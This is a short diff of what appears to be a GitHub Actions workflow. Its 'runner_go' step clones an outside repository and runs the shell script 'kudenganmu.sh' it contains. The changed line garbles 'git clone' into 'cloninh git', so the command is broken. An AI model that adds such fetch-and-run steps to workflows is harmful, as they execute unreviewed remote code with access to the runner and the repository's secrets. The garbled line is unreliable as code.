@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-        git clone https://github.com/SetanBudek/benihcinta.git && chmod +x kudenganmu.sh && ./kudenganmu.sh
+        cloninh git https://github.com/SetanBudek/benihcinta.git && chmod +x kudenganmu.sh && ./kudenganmu.sh
